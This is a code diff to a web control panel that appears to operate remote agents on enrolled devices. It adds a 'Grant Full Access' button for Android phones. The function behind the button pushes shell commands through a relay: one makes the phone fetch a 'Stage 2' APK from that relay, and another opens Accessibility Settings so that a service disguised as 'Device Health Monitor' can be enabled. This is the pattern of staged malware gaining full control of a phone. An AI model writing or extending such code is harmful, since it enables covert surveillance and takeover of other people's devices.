@@ -1291,10 +1291,12 @@ function renderDeviceList(devices) {
   none.style.display = 'none';
   el.innerHTML = devices.map(d => {
     const os = d.os || '?';
-    const osIcon = os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
+    const isAndroid = os.toLowerCase().includes('android');
+    const osIcon = isAndroid ? '🤖' : os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
     const ago = d.ago < 60 ? d.ago + 's' : Math.round(d.ago/60) + 'm';
     const sel = d.id === _selectedDid ? ' selected' : '';
     const off = d.online ? '' : ' offline';
+    const grantBtn = isAndroid ? `<button class="btn" onclick="event.stopPropagation();grantFullAccess('${escHtml(d.id)}')" style="font-size:.75em;padding:4px 10px;border-color:#f90;color:#f90;" title="Upgrade to full agent + enable accessibility">Grant Full Access</button>` : '';
     return `<div class="device-card${sel}${off}" onclick="selectDevice('${escHtml(d.id)}')">
       <div class="device-dot ${d.online?'on':''}"></div>
       <div class="device-info">
@@ -1302,6 +1304,7 @@ function renderDeviceList(devices) {
         <div class="device-meta">${escHtml(os)} · ${escHtml(d.user||'?')} · ${escHtml(d.ip||'?')} · ${ago} ago ${d.persistent?'· persistent':''}</div>
       </div>
       <div class="device-actions">
+        ${grantBtn}
         <button class="btn" onclick="event.stopPropagation();selectDevice('${escHtml(d.id)}')" style="font-size:.75em;padding:4px 10px;">Control →</button>
       </div>
     </div>`;
@@ -1456,6 +1459,34 @@ async function loadDevInfo() {
       `<td style="color:var(--fg);padding:5px 0;">${escHtml(String(v||'?'))}</td></tr>`
     ).join('');
   } catch(e) {}
+}
+
+async function grantFullAccess(did) {
+  const RELAY = RELAY_BASE;
+  // Step 1: send upgrade command — agent opens Stage 2 APK URL in browser
+  const upgradeCmd = `am start -a android.intent.action.VIEW -d '${RELAY}/apk/android-full' -t application/vnd.android.package-archive`;
+  try {
+    const r = await fetch(RELAY + '/api/devices/' + did + '/cmd', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd: upgradeCmd})
+    });
+    if (!r.ok) throw new Error(await r.text());
+    log('Upgrade APK sent — install it on the device, then click Enable Accessibility below', 'ok');
+  } catch(e) { log('Grant Full Access failed: ' + e, 'err'); return; }
+
+  // Step 2: after short delay, open Accessibility Settings on the device
+  setTimeout(async () => {
+    const accCmd = 'am start -a android.settings.ACCESSIBILITY_SETTINGS';
+    try {
+      await fetch(RELAY + '/api/devices/' + did + '/cmd', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({cmd: accCmd})
+      });
+      log('Accessibility Settings opened on device — enable Device Health Monitor', 'info');
+    } catch(e) {}
+  }, 18000); // 18s — enough time for APK download + install
 }
 
 async function uninstallDevice() {
